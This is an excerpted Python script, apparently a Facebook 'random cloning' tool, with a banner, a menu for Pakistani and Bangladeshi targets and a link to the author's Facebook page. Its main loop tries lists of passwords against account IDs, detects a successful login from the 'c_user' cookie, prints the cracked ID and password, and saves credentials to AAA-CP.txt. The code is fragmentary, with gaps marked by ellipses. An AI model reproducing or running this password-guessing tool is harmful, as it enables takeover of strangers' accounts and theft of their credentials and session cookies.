...
'\33[1;97m[*] Creater  : PICCI-ARIYAN
'\33[1;33m[*] Version  : 0.0.1
'\33[1;35m[*] GitHub   : https://github.com/PICCI-ARIYAN
'\33[1;91m[*] TEAM     : A A A 
\x1b[1;97m→   FB    : ARIYAN
\33[1;37m----------------------------------------------""")
...
def riaz():
	os.system('clear')
	print(logo)
	print('[A] PAK Random Cloning menu')
	print('[B] BD Random Cloning')
	print('[C] Create File ')
	print('[D] Follow me on Facebook')
	print('\x1b[1;97m[E] Exit Main menu')
	print('\33[1;37m----------------------------------------------')
	...
	if riaz1 =='D':
		os.system('xdg-open https://www.facebook.com/PICCI.ARIYAN.Akash?mibextid=ZbWKwL');riaz()
	if riaz1 =='B':
		bangla()
	else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AAA-OK] '+cid+'|'+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[A A A-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('AAA-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mPICCI-ARIYAN\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
